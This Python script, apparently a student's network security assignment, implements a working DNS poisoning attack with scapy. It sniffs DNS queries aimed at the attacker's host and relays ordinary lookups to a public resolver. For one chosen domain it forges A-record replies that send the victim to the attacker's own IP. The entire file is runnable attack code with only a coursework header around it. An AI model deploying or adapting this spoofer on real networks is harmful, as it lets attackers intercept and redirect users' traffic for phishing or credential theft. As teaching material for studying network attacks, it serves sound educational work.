"""
Python Version 3.8

Singapore Institute of Technology (SIT)
Information and Communications Technology (Information Security), BEng (Hons)

ICT-2203 Network Security Assignment 1

Author: @ Clement Chin / 1802951
Academic Year: 2020/2021
Lecturer: Dr. Woo Wing Keong
Submission Date: 25th October 2020

This script holds the code to perform DNS Poisoning.
	> Allow all normal traffic to pass through, acting as a middle man forwarding all the DNS packets
	> Once user enter a URL that is stated in MALICIOUS_IP, he/she will be redirected to MALICIOUS_IP
"""

from scapy.all import *

IFACE = conf.iface
QUERY = 0
RESPONSE = 1

MY_IP = get_if_addr(IFACE)

# Server Flags
DNS_SERVER = "8.8.8.8"

# Attacker Flags
MALICIOUS_SITE = b"secret.companyxyz.com."
MALICIOUS_IP = MY_IP


def dns_pkt_filter(pkt):
	""" Filters the incoming sniffed packet and parse to dns_reply """
	try:
		if pkt[IP].dst == MY_IP and pkt.haslayer(DNS):
			return pkt[UDP].dport == 53 and pkt[DNS].qr == QUERY

		return False

	except:
		pass


def dns_reply(pkt):
	""" Reply the client with the Fake DNS Reply """
	try:
		# Retrieve the DNS Question Name
		qname = pkt[DNSQR].qname
		
		# Let user browse through normal traffic
		if qname != MALICIOUS_SITE:
			dns_req = IP(dst=DNS_SERVER) \
					/ UDP(dport=53) \
					/ DNS(rd=1, qd=DNSQR(qname=qname))
			
			ans = sr1(dns_req, verbose=0)
			domain_ip = ans[DNSRR].rdata
		
		# User tries to access the site we want to spoof
		else:
			domain_ip = MALICIOUS_IP
			print(f"[*] Redirecting {pkt[IP].src} to {MALICIOUS_IP}")

		# Craft the Spoofed DNS Packet and send to requested Client
		spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
					  / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) \
					  / DNS(id=pkt[DNS].id,
							qr=RESPONSE,
							qd=pkt[DNS].qd,
							an=DNSRR(rrname=qname, type='A', ttl=124, rdata=domain_ip),
							ancount=1)

		send(spoofed_pkt, verbose=0)
		print(f"[*] Resolve {qname} for Client: {pkt[IP].src}")

	# Ignore all other traffic errors
	except:
		pass


def main():
	""" Main Sniffer Function """
	print("[*] Starting DNS Posioning ...")
	sniff(lfilter=dns_pkt_filter, prn=dns_reply, iface=IFACE)


if __name__ == '__main__':
	main()